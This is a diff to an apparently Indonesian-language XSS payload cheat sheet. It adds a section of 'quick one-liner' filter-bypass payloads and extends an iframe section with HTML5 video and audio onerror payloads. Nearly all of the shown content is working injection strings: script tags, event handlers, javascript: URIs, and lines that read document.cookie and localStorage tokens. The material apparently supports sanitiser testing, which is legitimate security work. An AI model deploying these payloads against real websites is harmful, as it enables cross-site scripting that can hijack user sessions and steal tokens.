@@ -10,7 +10,30 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-## 🧪 Collection Payload XSS
+## ⚡ Quick One-Liners (Verifikasi Filter/Bypass Audit)
+
+> **Tujuan:** Digunakan untuk tes cepat apakah filter hanya menghapus satu jenis tag/handler atau ada bias/ketimpangan dalam sanitasi.
+
+```html
+<!-- Check Filter Bias: Kombinasi Image Event Handler + Script Tag -->
+<img src=x onerror=alert(1)><script>alert(2)</script>
+<script>alert(3)</script><img src=x onerror=alert(4)>
+
+<!-- Check Breakout + Dual Tag Execution -->
+"><img src=x onerror=alert(5)><script>alert(6)</script>
+'"><script>alert(7)</script><svg onload=alert(8)>
+
+<!-- Check Mixed SVG + Image + Script Bypass -->
+<svg/onload=alert(9)><img src=x onerror=alert(10)>
+<details open onunhandledrejection=alert(11)><script>alert(12)</script>
+
+<!-- Check ES6 Template String + Multi Tag Combination -->
+<img/src=x onError="`${x}`;alert(13);"><script>alert(14)</script>
+
+<!-- Check iframe Pseudo-Protocol + Media Elements (video/audio) -->
+<iframe src="javascript:alert(15)"><video src=x onerror=alert(16)>
+<video><source src=x onerror=alert(17)></video><iframe src="javascript:alert(18)"></iframe>
+```
 
 ### 🔹 1. Basic `<script>` Tag Payloads
 
@@ -58,12 +81,15 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-### 🔹 5. `<iframe>` & JavaScript Pseudo-Protocol Payloads
+### 🔹 5. `<iframe>` & HTML5 Media Payloads (`<video>`, `<audio>`)
 
 ```html
 <iframe src="javascript:alert(`xss`)">
 <iframe src="javascript:alert(document.cookie)">
 <iframe src="javascript:alert(localStorage.getItem('token'))">
+<video src=x onerror=alert(1)>
+<video><source src=x onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
 ```
 
 ---
